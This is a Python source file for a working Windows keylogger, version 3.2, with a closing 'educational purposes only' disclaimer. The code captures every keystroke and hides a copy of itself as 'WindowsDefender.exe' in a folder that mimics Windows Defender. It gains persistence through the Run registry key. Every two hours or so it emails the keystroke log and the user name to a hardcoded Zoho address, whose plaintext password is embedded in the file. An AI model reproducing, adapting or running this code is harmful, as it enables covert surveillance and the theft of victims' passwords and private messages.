# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
# ░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
# ░██║░░██╗░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
# ░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
# ░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
# ░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
# ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.2

# Librerías Utilizadas
import smtplib
from pynput.keyboard import Key, Listener
import pynput
from getpass import getuser  # Obtiene el nombre del usuario
from datetime import datetime
import datetime
import os
import shutil
from winreg import *
# Library checks internet
import socket
import time
import threading  # Threads
import ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Convert key to a readable value


def KeyConMin(argument):                # Common Characters // Optimized
    switcher = {
        # Vocales Minisculas
        "'a'": "a",
        "'e'": "e",
        "'i'": "i",
        "'o'": "o",
        "'u'": "u",
        # Small Letters
        "'b'": "b",
        "'c'": "c",
        "'d'": "d",
        "'f'": "f",
        "'g'": "g",
        "'h'": "h",
        "'j'": "j",
        "'J'": "J",
        "'k'": "k",
        "'l'": "l",
        "'m'": "m",
        "'n'": "n",
        "'ñ'": "ñ",
        "'p'": "p",
        "'q'": "q",
        "'r'": "r",
        "'s'": "s",
        "'t'": "t",
        "'v'": "v",
        "'w'": "w",
        "'x'": "x",
        "'y'": "y",
        "'z'": "z",
        # Characters
        "','": ",",                     # ,
        "'.'": ".",                     # .
        "'_'": "_",                     # _
        "'-'": "-",                     # -
        "':'": ":",                     #
        # Uppercase Vowels
        "'A'": "A",
        "'E'": "E",
        "'I'": "I",
        "'O'": "O",
        "'U'": "U",
        # Capital letters
        "'B'": "B",
        "'C'": "C",
        "'D'": "D",
        "'F'": "F",
        "'G'": "G",
        "'H'": "H",
        "'K'": "K",
        "'L'": "L",
        "'M'": "M",
        "'N'": "N",
        "'Ñ'": "Ñ",
        "'P'": "P",
        "'Q'": "Q",
        "'R'": "R",
        "'S'": "S",
        "'T'": "T",
        "'V'": "V",
        "'W'": "W",
        "'X'": "X",
        "'Y'": "Y",
        "'Z'": "Z",
        # Standard Numbers
        "'1'": "1",
        "'2'": "2",
        "'3'": "3",
        "'4'": "4",
        "'5'": "5",
        "'6'": "6",
        "'7'": "7",
        "'8'": "8",
        "'9'": "9",
        "'0'": "0",
        # Special Characters
        "'@'": "@",                     # @
        "'#'": "#",                     # #
        "'*'": "*",                     #
        "'('": "(",                     # (
        "')'": ")",                     # )
        "'?'": "?",                     # ?
        "'='": "=",                     # =
        "'+'": "+",                     # +
        "'!'": "!",                     # !
        "'}'": "}",                     # }
        "'{'": "{",                     # {}
        "'´'": "´",                     # ´
        "'|'": "|",                     # |
        "'°'": "°",                     # °
        "'^'": "¬",                     # ^
        "';'": ";",                     #
        "'$'": "$",                     # $
        "'%'": "%",                     # %
        "'&'": "&",                     # &
        "'>'": ">",                     #
        "'<'": "<",                     #
        "'/'": "/",                     # /
        "'¿'": "¿",                     # ¿
        "'¡'": "¡",                     # ¡
        "'~'": "~"                      #
    }
    return switcher.get(argument, "")

# Convert key to a readable value


def KeyConMax(argument):                # Buttons, common // Optimized
    switcher = {
        "Key.space": " ",               # Space
        "Key.backspace": "«",           # Backspace
        "Key.enter": "\r\n",            # Line break
        "Key.tab": "    ",              # Tab
        "Key.delete": " «×» ",           # Delete
        # Numbers
        "<96>": "0",                 # 0
        "<97>": "1",                 # 1
        "<98>": "2",                 # 2
        "<99>": "3",                 # 3
        "<100>": "4",                # 4
        "<101>": "5",                # 5
        "<102>": "6",                # 6
        "<103>": "7",                # 7
        "<104>": "8",                # 8
        "<105>": "9",                # 9
        # Decimal numbers
        "None<96>": "0",                 # 0
        "None<97>": "1",                 # 1
        "None<98>": "2",                 # 2
        "None<99>": "3",                 # 3
        "None<100>": "4",                # 4
        "None<101>": "5",                # 5
        "None<102>": "6",                # 6
        "None<103>": "7",                # 7
        "None<104>": "8",                # 8
        "None<105>": "9",                # 9
        # Strange letters 2
        "['^']": "^",
        "['`']": "`",                     #
        "['¨']": "¨",                     #
        "['´']": "´",                     #
        "<110>": ".",                     #
        "None<110>": ".",                 #
        "Key.alt_l": " [Alt L] ",         #
        "Key.alt_r": " [Alt R] ",
        # "Key.shift_r": " [Shift R] ",
        # "Key.shift": " [Shift L] ",
        "Key.ctrl_r": " [Control R] ",    #
        "Key.ctrl_l": " [Control L] ",    #
        "Key.right": " [Right] ",                 #
        "Key.left": " [Left] ",                  #
        "Key.up": " [Up]",                    #
        "Key.down": " [Down] ",                  #
        # "'\x16'"  : " [Pegó] ",
        # "'\x18'"  : " [Cortar] ",
        # "'\x03'"  : " [Copiar] ",
        "Key.caps_lock": " [Mayus lock] ",
        #"Key.media_previous"    : " ♫ ",     #
        #"Key.media_next"        : " ♫→ ",         #
        #"Key.media_play_pause"  : " ■ ♫ ■ ",#
        "Key.cmd": " [Windows] "          #
    }
    return switcher.get(argument, "")

# Get keylogging and save to a log.txt file


def Klogger():
    try:        # Try to create the file
        log = os.environ.get(
            'pylogger_file',
            os.path.expanduser(
                'C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
        )

        T = datetime.datetime.now()
        getTime = "Date:      [" + T.strftime("%A") + " " + T.strftime("%d") + " of " + T.strftime("%B") + "]\nHour:       [" + T.strftime(
            "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p") + " with " + T.strftime("%S") + " Seconds]\n"

        with open(log, "a") as f:
            f.write("\n--------------------------------------------\nUserName:   ["+str(
                getuser()) + "]\n" + str(getTime)+"--------------------------------------------\n\n")
    except:  # If it can't create the file, create the missing directory
        CreateDir()  # Function: Create the directory ==> C:\Users\Public\Security\Windows Defender

    def on_press(key):
        with open(log, "a") as f:
            if (len(str(key))) <= 3:
                # print("[KeyConMin]")
                # print(KeyConMin(str(key)))
                f.write(KeyConMin(str(key)))
            else:
                # print("[KeyConMax]")
                # print(KeyConMax(str(key)))
                f.write(KeyConMax(str(key)))
    with Listener(on_press=on_press) as listener:  # Listen for keystrokes
        listener.join()


def sendEmail(log, sender_email, sender_password, receiver_email):
    # Create a multipart message and set headers
    # Message subject
    subject = "Data User: " + str(getuser())
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    date = datetime.datetime.now()
    information = "\nDate: " + date.strftime("%A") + " " + date.strftime("%d") + " of " + date.strftime("%B") + "\nHora: " + date.strftime(
        "%I") + ":" + date.strftime("%M") + " " + date.strftime("%p") + " with " + date.strftime("%S") + " Seconds"

    # Message body
    body = "Information:\n\nUserName: " + str(getuser()) + information

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = log
    # In same directory as script

    # Open TXT file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    try:
        # Log in to server using secure context and send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.zoho.com", 465, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, text)
            print("successfully sent email")
            server.quit()
        return True
    except:
        print("[-] The mail could not be sent")
        return False

# Rename the log file, before it is sent


def Rename(name):
    try:
        CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
        # Copy the file
        pathO = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
        pathN = "C:\\Users\\Public\\Security\\Windows Defender\\" + name + ".txt"
        os.rename(pathO, pathN)
    except:
        pass

# Function = Check if there is internet connection to be able to send the log


def VerificarConexion():
    # We create the connection socket
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:                                                            # Try to connect to Google server
        con.connect(('www.google.com', 80))
        con.close()
        return True
    except:
        return False

# Create the hidden directory


def CreateDir():
    try:  # Try to create the address
        os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
    except:
        pass

# Copy the Keylogger to the hidden folder


def EscondeKey():
    CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
    nameKey = "WindowsDefender.exe"
    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\" + nameKey

    try:
        with open(filePath, 'r') as f:      # Check if the keylogger is hidden in the system
            print("The keylogger is already in the hidden folder")
    except:
        print("The Keylogger is not found in the system, and will try to copy it")
        try:
            # Try to hide the keylogger in a folder
            shutil.copy(nameKey, filePath)
            print("The keylogger successfully hide itself in the system")
        except:
            print("Can't hide the Keylogger in the system")

# Time interval the log.txt file will be sent


def SendLog():
    n = 1   # To rename the files
    while (True):
        n = n+1

        # shipping mail [Principal]      <=> It will be sent
        sender_email_P = "eneboltest@zohomail.com"   # <<== change this email
        sender_password_P = "Y6dvxnd@"          # <<== email password

        # Email or emails that will receive the data record `log.txt`
        receiver_email = ["eneboltest@zohomail.com"]  # MultiEmail

        # Send every 2 hours approx
        for x in range(360):  # 720
            time.sleep(10)  # *10
            print("Pass: " + str(x*10))

        if VerificarConexion():  # Continue only if there is a connection
            # Create file name
            nameFile = "log"+str(n)
            # Rename the original file
            Rename(nameFile)    # Change the file `log.txt` a  `log2.txt`

            # Send the renamed file
            CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\' + \
                str(nameFile)+".txt"
            print("Shipping process")

            # Send with first email
            if sendEmail(homedir, sender_email_P, sender_password_P, receiver_email):
                # If it was sent correctly, then delete the file
                os.remove(homedir)
        else:   # no connection
            # Will keep overwriting the file
            # Will do nothing, and wait for a successful connection
            pass


def addStartup():  # function =  auto start
    # Full Software Path
    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe"
    # Startup name
    name = "Windows Defender"
    # Registry path
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    def verificar():
        try:  # Try to create the address
            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
            return True  # folder was created
        except:
            return False  # The folder already exists
    try:    # Only if you have administrator permissions
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal,
                           0, KEY_ALL_ACCESS)  # machine
        SetValueEx(registry, name, 0, REG_SZ, path)
        verificar()  # Create Folder
    except:  # If you don't have admin permissions
        if (verificar()):
            registry = OpenKey(HKEY_CURRENT_USER, keyVal,
                               0, KEY_ALL_ACCESS)  # local
            SetValueEx(registry, name, 0, REG_SZ, path)


# multithread start
if __name__ == '__main__':

    EscondeKey()    # Replicates inside the computer
    addStartup()    # Modify record
    p1 = threading.Thread(target=Klogger)
    p2 = threading.Thread(target=SendLog)
    p2.start()
    p1.start()
    p1.join()

#################################################################
#                                                               #
#                 Developed by SebastianEPH                     #
#                                                   v.3.2       #
#################################################################
# Important Notes
#
# *** This script was created for educational purposes only, for that detail the script is documented, I am not responsible for a possible misuse of this script***
#
# Read the documentation at: https://github.com/SebastianEPH/Keylogger_Python
